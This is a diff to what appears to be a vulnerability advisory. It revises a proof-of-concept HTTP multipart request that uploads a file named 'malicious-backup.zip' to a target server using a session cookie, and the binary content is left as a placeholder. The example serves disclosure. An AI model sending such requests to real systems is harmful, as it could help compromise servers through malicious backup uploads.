@@ -138,12 +138,24 @@ Host: target-halo-server
 Content-Type: multipart/form-data; boundary=----boundary
 Cookie: SESSION=<session_id>
 
-------boundary
-Content-Disposition: form-data; name="file"; filename="backup.zip"
-Content-Type: application/zip
+------WebKitFormBoundaryGxAtuAd1a3VkmhZY
+Content-Disposition: form-data; name="relativePath"
+
+null
+------WebKitFormBoundaryGxAtuAd1a3VkmhZY
+Content-Disposition: form-data; name="name"
+
+malicious-backup.zip
+------WebKitFormBoundaryGxAtuAd1a3VkmhZY
+Content-Disposition: form-data; name="type"
+
+application/x-zip-compressed
+------WebKitFormBoundaryGxAtuAd1a3VkmhZY
+Content-Disposition: form-data; name="file"; filename="malicious-backup.zip"
+Content-Type: application/x-zip-compressed
 
 <ZIP file binary content>
-------boundary--
+------WebKitFormBoundaryGxAtuAd1a3VkmhZY--
 ```
 
 <img width="1497" height="699" alt="image" src="https://github.com/user-attachments/assets/9226e52b-db7a-4bc1-aaa5-64a4ee881fb6" />
